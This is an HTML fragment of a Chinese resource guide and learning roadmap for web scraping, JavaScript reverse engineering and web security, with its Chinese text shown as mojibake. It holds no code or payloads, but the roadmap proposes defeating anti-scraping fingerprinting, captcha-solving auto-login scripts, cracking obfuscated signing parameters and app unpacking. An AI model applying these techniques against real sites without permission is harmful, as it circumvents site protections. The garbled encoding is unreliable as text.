  <td>â­â­â­â­â­</td>
  <td>â€¢ JavaScript æ ¸å¿ƒè¯­æ³•<br>â€¢ DOM æ“ä½œ<br>â€¢ BOM å¯¹è±¡<br>â€¢ å¼‚æ­¥ç¼–ç¨‹<br>â€¢ é¢å‘å¯¹è±¡ç¼–ç¨‹</td>
  <td>å‰ç«¯åŸºç¡€å…¥é—¨</td>
</tr>
<tr>
  <td><strong>ä½ ä¸çŸ¥é“çš„ JavaScriptï¼ˆä¸Šã€ä¸­ã€ä¸‹å·ï¼‰</strong></td>
  <td>Kyle Simpson</td>
  <td>â­â­â­â­</td>
  <td>â­â­â­â­â­</td>
  <td>â€¢ ä½œç”¨åŸŸä¸é—­åŒ…<br>â€¢ this ä¸å¯¹è±¡åŸå‹<br>â€¢ ç±»å‹ä¸è¯­æ³•<br>â€¢ å¼‚æ­¥ä¸æ€§èƒ½<br>â€¢ ES6 åŠæ›´æ–°ç‰¹æ€§</td>
  <td>JavaScript è¿›é˜¶å­¦ä¹ </td>
</tr>
<tr>
  <td><strong>JavaScript å¿è€…ç§˜ç±ï¼ˆç¬¬ 2 ç‰ˆï¼‰</strong></td>
  <td>John Resigï¼ˆjQuery ä½œè€…ï¼‰</td>
  <td>â­â­â­â­</td>
  <td>â­â­â­â­</td>
  <td>â€¢ å‡½æ•°å¼ç¼–ç¨‹<br>â€¢ é—­åŒ…ä¸ä½œç”¨åŸŸ<br>â€¢ åŸå‹ä¸ç»§æ‰¿<br>â€¢ æ­£åˆ™è¡¨è¾¾å¼</td>
  <td>JavaScript æ·±å…¥ç†è§£</td>
</tr>
</tbody>
</table>
<p><strong>åœ¨çº¿èµ„æº</strong>:</p>
<ul>
<li>ã€Šä½ ä¸çŸ¥é“çš„ JavaScriptã€‹åœ¨çº¿ç‰ˆ: https://github.com/getify/You-Dont-Know-JS</li>
</ul>
<hr />
<h3>HTTP ä¸ç½‘ç»œåè®®</h3>
<table>
<thead>
<tr>
  <th>ä¹¦å</th>
  <th>ä½œè€…</th>
  <th>éš¾åº¦</th>
  <th>æ¨èæŒ‡æ•°</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>é€‚åˆäººç¾¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å›¾è§£ HTTP</strong></td>
  <td>ä¸Šé‡å®£</td>
  <td>â­â­</td>
  <td>â­â­â­â­â­</td>
  <td>â€¢ HTTP åè®®åŸºç¡€<br>â€¢ è¯·æ±‚ä¸å“åº”<br>â€¢ HTTP æ–¹æ³•<br>â€¢ çŠ¶æ€ç <br>â€¢ HTTPS ä¸ SSL/TLS</td>
  <td>ç½‘ç»œåè®®å…¥é—¨</td>
</tr>
<tr>
  <td><strong>HTTP æƒå¨æŒ‡å—</strong></td>
  <td>David Gourley, Brian Totty</td>
  <td>â­â­â­</td>
  <td>â­â­â­â­</td>
  <td>â€¢ HTTP å®Œæ•´è§„èŒƒ<br>â€¢ ç¼“å­˜æœºåˆ¶<br>â€¢ ä»£ç†ä¸ç½‘å…³<br>â€¢ Web å®‰å…¨</td>
  <td>HTTP æ·±å…¥å­¦ä¹ </td>
</tr>
</tbody>
</table>
<hr />
<h3>é€†å‘å·¥ç¨‹ä¸å®‰å…¨</h3>
<table>
<thead>
<tr>
  <th>ä¹¦å</th>
  <th>ä½œè€…</th>
  <th>éš¾åº¦</th>
  <th>æ¨èæŒ‡æ•°</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>é€‚åˆäººç¾¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Web å®‰å…¨æ·±åº¦å‰–æ</strong></td>
  <td>å¼ ç‚³å¸…</td>
  <td>â­â­â­â­</td>
  <td>â­â­â­â­</td>
  <td>â€¢ XSS/CSRF/SQL æ³¨å…¥<br>â€¢ åŠ å¯†ä¸è®¤è¯<br>â€¢ ä»£ç æ··æ·†<br>â€¢ åçˆ¬è™«æŠ€æœ¯</td>
  <td>Web å®‰å…¨å…¥é—¨</td>
</tr>
<tr>
  <td><strong>ç™½å¸½å­è®² Web å®‰å…¨</strong></td>
  <td>å´ç¿°æ¸…</td>
  <td>â­â­â­</td>
  <td>â­â­â­â­â­</td>
  <td>â€¢ å¸¸è§ Web æ¼æ´<br>â€¢ å®‰å…¨é˜²æŠ¤<br>â€¢ æ¸—é€æµ‹è¯•<br>â€¢ åº”ç”¨å®‰å…¨</td>
  <td>Web å®‰å…¨åŸºç¡€</td>
</tr>
<tr>
  <td><strong>åŠ å¯†ä¸è§£å¯†ï¼ˆç¬¬ 4 ç‰ˆï¼‰</strong></td>
  <td>æ®µé’¢</td>
  <td>â­â­â­â­â­</td>
  <td>â­â­â­â­</td>
  <td>â€¢ é€†å‘å·¥ç¨‹åŸºç¡€<br>â€¢ åŠ å¯†ç®—æ³•<br>â€¢ ä»£ç ä¿æŠ¤<br>â€¢ åè°ƒè¯•æŠ€æœ¯</td>
  <td>é€†å‘å·¥ç¨‹è¿›é˜¶</td>
</tr>
</tbody>
</table>
<hr />
<h3>Python çˆ¬è™«</h3>
<table>
<thead>
<tr>
  <th>ä¹¦å</th>
  <th>ä½œè€…</th>
  <th>éš¾åº¦</th>
  <th>æ¨èæŒ‡æ•°</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>é€‚åˆäººç¾¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Python ç½‘ç»œçˆ¬è™«æƒå¨æŒ‡å—</strong></td>
  <td>Ryan Mitchell</td>
  <td>â­â­â­</td>
  <td>â­â­â­â­</td>
  <td>â€¢ çˆ¬è™«åŸºç¡€<br>â€¢ BeautifulSoup/Scrapy<br>â€¢ JavaScript æ¸²æŸ“<br>â€¢ åçˆ¬è™«å¯¹æŠ—</td>
  <td>Python çˆ¬è™«å…¥é—¨</td>
</tr>
</tbody>
</table>
<hr />
<h2>åœ¨çº¿è¯¾ç¨‹</h2>
<h3>ç»¼åˆå¹³å°</h3>
<table>
<thead>
<tr>
  <th>å¹³å°</th>
  <th>ç½‘å€</th>
  <th>æ¨èè¯¾ç¨‹</th>
  <th>ç‰¹ç‚¹</th>
  <th>ä»·æ ¼</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Udemy</strong></td>
  <td>https://www.udemy.com/</td>
  <td>â€¢ The Complete Web Developer Course<br>â€¢ JavaScript: Understanding the Weird Parts<br>â€¢ Web Scraping with Python</td>
  <td>â€¢ ç»å¸¸æ‰“æŠ˜ï¼ˆ10-20 ç¾å…ƒï¼‰<br>â€¢ ç»ˆèº«è®¿é—®<br>â€¢ ä¸­è‹±æ–‡å­—å¹•</td>
  <td>$10-20ï¼ˆæ‰“æŠ˜æ—¶ï¼‰</td>
</tr>
<tr>
  <td><strong>Coursera</strong></td>
  <td>https://www.coursera.org/</td>
  <td>â€¢ Web Design for Everybody (å¯†æ­‡æ ¹å¤§å­¦)<br>â€¢ CS50's Web Programming (å“ˆä½›å¤§å­¦)</td>
  <td>â€¢ é¡¶å°–å¤§å­¦è¯¾ç¨‹<br>â€¢ è®¤è¯è¯ä¹¦<br>â€¢ éƒ¨åˆ†è¯¾ç¨‹å…è´¹æ—å¬</td>
  <td>å…è´¹æ—å¬ / $49/æœˆ</td>
</tr>
</tbody>
</table>
<hr />
<h3>ä¸­æ–‡å¹³å°</h3>
<table>
<thead>
<tr>
  <th>å¹³å°</th>
  <th>ç½‘å€</th>
  <th>æ¨èè¯¾ç¨‹/ä¸“æ </th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ…•è¯¾ç½‘</strong></td>
  <td>https://www.imooc.com/</td>
  <td>â€¢ å‰ç«¯ JavaScript è¿›é˜¶<br>â€¢ Python çˆ¬è™«å·¥ç¨‹å¸ˆ<br>â€¢ Web å®‰å…¨å·¥ç¨‹å¸ˆ</td>
  <td>å®æˆ˜é¡¹ç›®å¯¼å‘</td>
</tr>
<tr>
  <td><strong>æå®¢æ—¶é—´</strong></td>
  <td>https://time.geekbang.org/</td>
  <td>â€¢ æµè§ˆå™¨å·¥ä½œåŸç†ä¸å®è·µ<br>â€¢ JavaScript æ ¸å¿ƒåŸç†è§£æ<br>â€¢ ç½‘ç»œåè®®æ”»ç•¥</td>
  <td>æ·±åº¦æŠ€æœ¯æ–‡ç« </td>
</tr>
</tbody>
</table>
<hr />
<h2>åšå®¢ä¸æ–‡ç« </h2>
<h3>æŠ€æœ¯åšå®¢</h3>
<table>
<thead>
<tr>
  <th>åšå®¢åç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å¾çˆ±ç ´è§£è®ºå›</strong></td>
  <td>https://www.52pojie.cn/</td>
  <td>é€†å‘å·¥ç¨‹ã€è½¯ä»¶ç ´è§£ã€åæ··æ·†æŠ€æœ¯</td>
  <td>ä¸­æ–‡ç¤¾åŒºã€å®æˆ˜æ¡ˆä¾‹ä¸°å¯Œ</td>
</tr>
<tr>
  <td><strong>çœ‹é›ªè®ºå›</strong></td>
  <td>https://bbs.kanxue.com/</td>
  <td>äºŒè¿›åˆ¶é€†å‘ã€åŠ å¯†ç®—æ³•ã€å®‰å…¨ç ”ç©¶</td>
  <td>ä¸“ä¸šæ·±åº¦ã€é«˜è´¨é‡è®¨è®º</td>
</tr>
<tr>
  <td><strong>å…ˆçŸ¥ç¤¾åŒº</strong></td>
  <td>https://xz.aliyun.com/</td>
  <td>Web å®‰å…¨ã€æ¸—é€æµ‹è¯•ã€æ¼æ´åˆ†æ</td>
  <td>é˜¿é‡Œäº‘å®˜æ–¹ã€å®‰å…¨èµ„è®¯</td>
</tr>
<tr>
  <td><strong>ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ</strong></td>
  <td>https://tech.meituan.com/</td>
  <td>å‰ç«¯å®‰å…¨ç³»åˆ—ã€JavaScript æ€§èƒ½ä¼˜åŒ–</td>
  <td>å¤§å‚å®æˆ˜ç»éªŒ</td>
</tr>
<tr>
  <td><strong>é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—</strong></td>
  <td>https://www.ruanyifeng.com/blog/</td>
  <td>JavaScript æ•™ç¨‹ã€ES6 å…¥é—¨ã€HTTP åè®®</td>
  <td>é€šä¿—æ˜“æ‡‚ã€å®šæœŸæ›´æ–°</td>
</tr>
<tr>
  <td><strong>å¼ é‘«æ—­çš„åšå®¢</strong></td>
  <td>https://www.zhangxinxu.com/</td>
  <td>CSSã€JavaScriptã€Web å‰ç«¯</td>
  <td>æ·±åº¦åŸåˆ›ã€å®ç”¨æŠ€å·§</td>
</tr>
</tbody>
</table>
<hr />
<h3>å›½å¤–ä¼˜è´¨åšå®¢</h3>
<table>
<thead>
<tr>
  <th>åšå®¢åç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Martin Fowler</strong></td>
  <td>https://martinfowler.com/</td>
  <td>è½¯ä»¶æ¶æ„ã€è®¾è®¡æ¨¡å¼</td>
  <td>è¡Œä¸šæƒå¨</td>
</tr>
<tr>
  <td><strong>CSS-Tricks</strong></td>
  <td>https://css-tricks.com/</td>
  <td>å‰ç«¯å¼€å‘æŠ€å·§</td>
  <td>å®ç”¨æ•™ç¨‹</td>
</tr>
</tbody>
</table>
<hr />
<h2>è§†é¢‘æ•™ç¨‹</h2>
<h3>YouTube é¢‘é“</h3>
<table>
<thead>
<tr>
  <th>é¢‘é“åç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Traversy Media</strong></td>
  <td>https://www.youtube.com/@TraversyMedia</td>
  <td>Web å¼€å‘ã€JavaScriptã€Python</td>
  <td>å®æˆ˜é¡¹ç›®ã€åˆå­¦è€…å‹å¥½</td>
</tr>
<tr>
  <td><strong>The Net Ninja</strong></td>
  <td>https://www.youtube.com/@NetNinja</td>
  <td>å‰ç«¯æ¡†æ¶ã€Node.jsã€æ•°æ®åº“</td>
  <td>ç³»åˆ—æ•™ç¨‹ã€å¾ªåºæ¸è¿›</td>
</tr>
<tr>
  <td><strong>John Hammond</strong></td>
  <td>https://www.youtube.com/@_JohnHammond</td>
  <td>CTFã€é€†å‘å·¥ç¨‹ã€ç½‘ç»œå®‰å…¨</td>
  <td>CTF é¢˜è§£ã€å®æˆ˜æ¼”ç¤º</td>
</tr>
</tbody>
</table>
<hr />
<h3>ä¸­æ–‡è§†é¢‘ï¼ˆB ç«™ï¼‰</h3>
<table>
<thead>
<tr>
  <th>UP ä¸»</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å°šç¡…è°·</strong></td>
  <td>å‰ç«¯/åç«¯ç³»ç»Ÿè¯¾ç¨‹</td>
  <td>å®Œæ•´è¯¾ç¨‹ä½“ç³»</td>
</tr>
<tr>
  <td><strong>coderwhy</strong></td>
  <td>å‰ç«¯è¿›é˜¶æ•™ç¨‹</td>
  <td>Vue/React æ·±åº¦è®²è§£</td>
</tr>
<tr>
  <td><strong>æŠ€æœ¯è›‹è€å¸ˆ</strong></td>
  <td>çˆ¬è™«ä¸é€†å‘</td>
  <td>å®æˆ˜å¯¼å‘</td>
</tr>
<tr>
  <td><strong>å´”åº†æ‰ä¸¨é™è§…</strong></td>
  <td>Python çˆ¬è™«ä¸“å®¶</td>
  <td>çˆ¬è™«å…¨æ ˆæ•™ç¨‹</td>
</tr>
</tbody>
</table>
<p><strong>ç‰¹ç‚¹</strong>: å…è´¹é«˜è´¨é‡ã€å¼¹å¹•äº’åŠ¨</p>
<hr />
<h2>ç»ƒä¹ å¹³å°</h2>
<h3>CTF å¹³å°</h3>
<table>
<thead>
<tr>
  <th>å¹³å°åç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>éš¾åº¦</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>BUUCTF</strong></td>
  <td>https://buuoj.cn/</td>
  <td>Webã€é€†å‘ã€PWNã€å¯†ç å­¦</td>
  <td>â­â­</td>
  <td>ä¸­æ–‡ç•Œé¢ã€é¢˜ç›®ä¸°å¯Œã€é€‚åˆæ–°æ‰‹</td>
</tr>
<tr>
  <td><strong>CTFHub</strong></td>
  <td>https://www.ctfhub.com/</td>
  <td>Web å®‰å…¨æŠ€èƒ½æ ‘</td>
  <td>â­â­â­</td>
  <td>ç³»ç»ŸåŒ–å­¦ä¹ è·¯å¾„</td>
</tr>
<tr>
  <td><strong>picoCTF</strong></td>
  <td>https://picoctf.org/</td>
  <td>é¢å‘åˆå­¦è€…çš„ CTF</td>
  <td>â­â­</td>
  <td>æ•™è‚²å¯¼å‘ã€é€æ­¥æå‡</td>
</tr>
<tr>
  <td><strong>Hack The Box</strong></td>
  <td>https://www.hackthebox.com/</td>
  <td>æ¸—é€æµ‹è¯•ã€é€†å‘å·¥ç¨‹</td>
  <td>â­â­â­â­</td>
  <td>çœŸå®ç¯å¢ƒã€å›½é™…çŸ¥å</td>
</tr>
</tbody>
</table>
<hr />
<h3>JavaScript ç»ƒä¹ </h3>
<table>
<thead>
<tr>
  <th>å¹³å°åç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>JavaScript30</strong></td>
  <td>https://javascript30.com/</td>
  <td>30 ä¸ªçº¯ JavaScript é¡¹ç›®</td>
  <td>å…è´¹ã€æ— æ¡†æ¶ã€å®æˆ˜å¯¼å‘</td>
</tr>
<tr>
  <td><strong>Codewars</strong></td>
  <td>https://www.codewars.com/</td>
  <td>ç®—æ³•é¢˜åº“ï¼ˆå¤šè¯­è¨€ï¼‰</td>
  <td>æ¸¸æˆåŒ–ã€ç¤¾åŒºè®¨è®º</td>
</tr>
<tr>
  <td><strong>LeetCode</strong></td>
  <td>https://leetcode.com/</td>
  <td>ç®—æ³•ä¸æ•°æ®ç»“æ„</td>
  <td>é¢è¯•å¿…å¤‡ã€ä¸­è‹±æ–‡ç‰ˆæœ¬</td>
</tr>
</tbody>
</table>
<hr />
<h3>çˆ¬è™«å®æˆ˜</h3>
<table>
<thead>
<tr>
  <th>èµ„æºåç§°</th>
  <th>ç½‘å€</th>
  <th>å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Scrapy å®˜æ–¹æ•™ç¨‹</strong></td>
  <td>https://docs.scrapy.org/en/latest/intro/tutorial.html</td>
  <td>Scrapy æ¡†æ¶ä½¿ç”¨</td>
  <td>å®˜æ–¹æ–‡æ¡£ã€ç¤ºä¾‹å®Œæ•´</td>
</tr>
</tbody>
</table>
<hr />
<h2>å·¥å…·æ–‡æ¡£</h2>
<h3>æµè§ˆå™¨è‡ªåŠ¨åŒ–</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>å®˜æ–¹æ–‡æ¡£</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Puppeteer</strong></td>
  <td>https://pptr.dev/</td>
  <td>API å®Œæ•´ã€ç¤ºä¾‹ä¸°å¯Œ</td>
</tr>
<tr>
  <td><strong>Playwright</strong></td>
  <td>https://playwright.dev/</td>
  <td>è·¨æµè§ˆå™¨ã€æ–‡æ¡£è¯¦ç»†</td>
</tr>
<tr>
  <td><strong>Selenium</strong></td>
  <td>https://www.selenium.dev/documentation/</td>
  <td>å¤šè¯­è¨€æ”¯æŒ</td>
</tr>
</tbody>
</table>
<hr />
<h3>æŠ“åŒ…å·¥å…·</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>å®˜æ–¹æ–‡æ¡£</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>mitmproxy</strong></td>
  <td>https://docs.mitmproxy.org/</td>
  <td>è¯¦ç»†æ•™ç¨‹ã€è„šæœ¬ç¤ºä¾‹</td>
</tr>
<tr>
  <td><strong>Burp Suite å­¦é™¢</strong></td>
  <td>https://portswigger.net/web-security</td>
  <td>æƒå¨ä¸“ä¸šã€äº’åŠ¨å®éªŒ</td>
</tr>
</tbody>
</table>
<hr />
<h2>ç¤¾åŒºä¸è®ºå›</h2>
<h3>å›½å†…ç¤¾åŒº</h3>
<table>
<thead>
<tr>
  <th>ç¤¾åŒºåç§°</th>
  <th>ç½‘å€</th>
  <th>ä¸»è¦æ ‡ç­¾/èŠ‚ç‚¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ˜é‡‘</strong></td>
  <td>https://juejin.cn/</td>
  <td>JavaScriptã€å‰ç«¯ã€çˆ¬è™«</td>
  <td>é«˜è´¨é‡æŠ€æœ¯æ–‡ç« </td>
</tr>
<tr>
  <td><strong>SegmentFault</strong></td>
  <td>https://segmentfault.com/</td>
  <td>æŠ€æœ¯é—®ç­”</td>
  <td>é—®ç­”ç¤¾åŒºã€æŠ€æœ¯åˆ†äº«</td>
</tr>
<tr>
  <td><strong>V2EX</strong></td>
  <td>https://www.v2ex.com/</td>
  <td><code>/go/programmer</code></td>
  <td>æŠ€æœ¯äº¤æµã€è¡Œä¸šè®¨è®º</td>
</tr>
</tbody>
</table>
<hr />
<h3>å›½å¤–ç¤¾åŒº</h3>
<table>
<thead>
<tr>
  <th>ç¤¾åŒºåç§°</th>
  <th>ç½‘å€/æ¿å—</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Stack Overflow</strong></td>
  <td>https://stackoverflow.com/</td>
  <td><code>web-scraping</code>, <code>javascript</code>, <code>reverse-engineering</code></td>
  <td>å…¨çƒæœ€å¤§æŠ€æœ¯é—®ç­”</td>
</tr>
<tr>
  <td><strong>Reddit</strong></td>
  <td>â€¢ r/webscraping<br>â€¢ r/javascript<br>â€¢ r/ReverseEngineering<br>â€¢ r/netsec</td>
  <td>Web çˆ¬è™«ã€JavaScriptã€é€†å‘ã€å®‰å…¨</td>
  <td>è®¨è®ºæ´»è·ƒã€èµ„æºåˆ†äº«</td>
</tr>
<tr>
  <td><strong>GitHub Discussions</strong></td>
  <td>puppeteer/puppeteer<br>scrapy/scrapy<br>babel/babel</td>
  <td>é¡¹ç›®è®¨è®º</td>
  <td>å®˜æ–¹ç¤¾åŒºã€æŠ€æœ¯äº¤æµ</td>
</tr>
</tbody>
</table>
<hr />
<h2>å­¦ä¹ è·¯çº¿å»ºè®®</h2>
<h3>é˜¶æ®µä¸€ï¼šåŸºç¡€å¤¯å®ï¼ˆ1-2 ä¸ªæœˆï¼‰</h3>
<table>
<thead>
<tr>
  <th>ç›®æ ‡</th>
  <th>å­¦ä¹ å†…å®¹</th>
  <th>å®æˆ˜é¡¹ç›®</th>
</tr>
</thead>
<tbody>
<tr>
  <td>æŒæ¡ Web åŸºç¡€å’Œå¼€å‘è€…å·¥å…·</td>
  <td>1. <strong>HTTP åè®®</strong>: ã€Šå›¾è§£ HTTPã€‹<br>2. <strong>JavaScript åŸºç¡€</strong>: ã€ŠJavaScript é«˜çº§ç¨‹åºè®¾è®¡ã€‹å‰ 10 ç« <br>3. <strong>å¼€å‘è€…å·¥å…·</strong>: Chrome DevTools å®˜æ–¹æ–‡æ¡£<br>4. <strong>HTML/CSS</strong>: MDN Web Docs</td>
  <td>â€¢ ç”¨ Chrome DevTools åˆ†æ 10 ä¸ªä¸åŒç½‘ç«™çš„è¯·æ±‚<br>â€¢ å®Œæˆ JavaScript30 çš„å‰ 10 ä¸ªé¡¹ç›®<br>â€¢ æ‰‹å†™ç®€å•çš„è¡¨å•éªŒè¯å’Œ AJAX è¯·æ±‚</td>
</tr>
</tbody>
</table>
<hr />
<h3>é˜¶æ®µäºŒï¼šå·¥å…·æŒæ¡ï¼ˆ1-2 ä¸ªæœˆï¼‰</h3>
<table>
<thead>
<tr>
  <th>ç›®æ ‡</th>
  <th>å­¦ä¹ å†…å®¹</th>
  <th>å®æˆ˜é¡¹ç›®</th>
</tr>
</thead>
<tbody>
<tr>
  <td>ç†Ÿç»ƒä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å’ŒæŠ“åŒ…å·¥å…·</td>
  <td>1. <strong>Puppeteer</strong>: å®˜æ–¹æ–‡æ¡£ + å®æˆ˜æ¡ˆä¾‹<br>2. <strong>æŠ“åŒ…å·¥å…·</strong>: Burp Suite æˆ– Charles<br>3. <strong>Python åŸºç¡€</strong>: å»–é›ªå³° Python æ•™ç¨‹<br>4. <strong>æ­£åˆ™è¡¨è¾¾å¼</strong>: åœ¨çº¿ç»ƒä¹ ï¼ˆregex101.comï¼‰</td>
  <td>â€¢ ç”¨ Puppeteer çˆ¬å– 3 ä¸ªåŠ¨æ€ç½‘ç«™<br>â€¢ ç”¨ Burp Suite åˆ†æç§»åŠ¨ APP æ¥å£<br>â€¢ å†™ä¸€ä¸ªè‡ªåŠ¨ç™»å½•è„šæœ¬ï¼ˆå¸¦éªŒè¯ç è¯†åˆ«ï¼‰</td>
</tr>
</tbody>
</table>
<hr />
<h3>é˜¶æ®µä¸‰ï¼šé€†å‘æŠ€æœ¯ï¼ˆ2-3 ä¸ªæœˆï¼‰</h3>
<table>
<thead>
<tr>
  <th>ç›®æ ‡</th>
  <th>å­¦ä¹ å†…å®¹</th>
  <th>å®æˆ˜é¡¹ç›®</th>
</tr>
</thead>
<tbody>
<tr>
  <td>ç†è§£åŠ å¯†ã€æ··æ·†ã€åè°ƒè¯•æŠ€æœ¯</td>
  <td>1. <strong>JavaScript è¿›é˜¶</strong>: ã€Šä½ ä¸çŸ¥é“çš„ JavaScriptã€‹<br>2. <strong>åŠ å¯†ç®—æ³•</strong>: crypto-js æ–‡æ¡£ + CyberChef å®è·µ<br>3. <strong>AST è§£æ</strong>: Babel æ’ä»¶å¼€å‘æ•™ç¨‹<br>4. <strong>åæ··æ·†</strong>: webcrackã€de4js å·¥å…·ä½¿ç”¨</td>
  <td>â€¢ åˆ†æ 5 ä¸ªç½‘ç«™çš„åŠ å¯†å‚æ•°ï¼ˆsignã€tokenï¼‰<br>â€¢ ç”¨ Babel å†™ä¸€ä¸ªç®€å•çš„åæ··æ·†è„šæœ¬<br>â€¢ ç ´è§£ä¸€ä¸ªç®€å•çš„ JavaScript æ··æ·†</td>
</tr>
</tbody>
</table>
<hr />
<h3>é˜¶æ®µå››ï¼šç»¼åˆå®æˆ˜ï¼ˆæŒç»­ï¼‰</h3>
<table>
<thead>
<tr>
  <th>ç›®æ ‡</th>
  <th>å­¦ä¹ å†…å®¹</th>
  <th>å®æˆ˜é¡¹ç›®</th>
</tr>
</thead>
<tbody>
<tr>
  <td>è§£å†³çœŸå®ä¸–ç•Œçš„å¤æ‚æ¡ˆä¾‹</td>
  <td>1. <strong>é«˜çº§åçˆ¬è™«</strong>: TLS æŒ‡çº¹ã€Canvas æŒ‡çº¹ã€è®¾å¤‡æŒ‡çº¹<br>2. <strong>åè®®é€†å‘</strong>: WebSocketã€gRPCã€Protobuf<br>3. <strong>WebAssembly</strong>: wabt å·¥å…·é“¾ã€é€†å‘åˆ†æ<br>4. <strong>ç§»åŠ¨ç«¯</strong>: Frida Hookã€APP è„±å£³</td>
  <td>â€¢ å‚åŠ  CTF æ¯”èµ›ï¼ˆWeb æ–¹å‘ï¼‰<br>â€¢ é€†å‘ä¸€ä¸ª Webpack æ‰“åŒ…çš„ SPA åº”ç”¨<br>â€¢ åˆ†æä¸€ä¸ªä½¿ç”¨ WebAssembly çš„ç½‘ç«™<br>â€¢ å®Œæˆå¾çˆ±ç ´è§£è®ºå›çš„é€†å‘é¢˜ç›®</td>
</tr>
</tbody>
</table>
<hr />
<h2>å­¦ä¹ æŠ€å·§</h2>
<h3>é«˜æ•ˆå­¦ä¹ æ–¹æ³•</h3>
<table>
<thead>
<tr>
  <th>æ–¹æ³•</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>ä»¥é¡¹ç›®ä¸ºé©±åŠ¨</strong></td>
  <td>è¾¹å­¦è¾¹åšï¼Œä¸è¦åªçœ‹ä¸ç»ƒ</td>
</tr>
<tr>
  <td><strong>ä¸»åŠ¨è°ƒè¯•</strong></td>
  <td>å¤šç”¨æ–­ç‚¹ï¼Œå°‘çŒœæµ‹</td>
</tr>
<tr>
  <td><strong>è®°å½•ç¬”è®°</strong></td>
  <td>æ•´ç†å¸¸è§å¥—è·¯å’ŒæŠ€å·§</td>
</tr>
<tr>
  <td><strong>åˆ†äº«äº¤æµ</strong></td>
  <td>å†™åšå®¢ã€å‚ä¸è®¨è®º</td>
</tr>
<tr>
  <td><strong>å®šæœŸå¤ä¹ </strong></td>
  <td>æ¸©æ•…çŸ¥æ–°ï¼Œå·©å›ºçŸ¥è¯†</td>
</tr>
</tbody>
</table>
<hr />
<h3>å¸¸è§è¯¯åŒº</h3>
<table>
<thead>
<tr>
  <th>è¯¯åŒº</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td>âŒ <strong>åªçœ‹æ•™ç¨‹ä¸åŠ¨æ‰‹</strong></td>
  <td>çœ‹æ‡‚ â‰  ä¼šåš</td>
</tr>
<tr>
  <td>âŒ <strong>è¿½æ±‚å·¥å…·è€ŒéåŸç†</strong></td>
  <td>å·¥å…·ä¼šè¿‡æ—¶ï¼ŒåŸç†ä¸ä¼š</td>
</tr>
<tr>
  <td>âŒ <strong>å®Œç¾ä¸»ä¹‰</strong></td>
  <td>ä¸éœ€è¦ 100% è¿˜åŸä»£ç ï¼Œç†è§£æ ¸å¿ƒé€»è¾‘å³å¯</td>
</tr>
<tr>
  <td>âŒ <strong>å­¤ç«‹å­¦ä¹ </strong></td>
  <td>å¤šä¸ç¤¾åŒºäº¤æµï¼Œé¿å…é—­é—¨é€ è½¦</td>
</tr>
<tr>
  <td>âŒ <strong>å¿½è§†åŸºç¡€</strong></td>
  <td>HTTPã€JavaScript åŸºç¡€æ˜¯ä¸€åˆ‡çš„æ ¹åŸº</td>
</tr>
</tbody>
</table>
<hr />
<h3>æ—¶é—´ç®¡ç†</h3>
<p><strong>æ¯æ—¥å­¦ä¹ è®¡åˆ’ç¤ºä¾‹</strong>:</p>
<table>
<thead>
<tr>
  <th>æ—¶é—´æ®µ</th>
  <th>å­¦ä¹ å†…å®¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td>09:00-10:00</td>
  <td>é˜…è¯»ç†è®ºçŸ¥è¯†ï¼ˆä¹¦ç±/æ–‡ç« ï¼‰</td>
</tr>
<tr>
  <td>10:00-12:00</td>
  <td>å®æˆ˜ç»ƒä¹ ï¼ˆå†™ä»£ç /åšé¢˜ï¼‰</td>
</tr>
<tr>
  <td>14:00-16:00</td>
  <td>é¡¹ç›®å®è·µ</td>
</tr>
<tr>
  <td>16:00-17:00</td>
  <td>å¤ç›˜æ€»ç»“ï¼ˆå†™ç¬”è®°/åšå®¢ï¼‰</td>
</tr>
</tbody>
</table>
<p><strong>æ¯å‘¨ç›®æ ‡</strong>:</p>
<ul>
<li>âœ… å®Œæˆ 1-2 ä¸ªå°é¡¹ç›®</li>
<li>âœ… é˜…è¯» 3-5 ç¯‡æŠ€æœ¯æ–‡ç« </li>
<li>âœ… è§£å†³ 5-10 é“ç»ƒä¹ é¢˜</li>
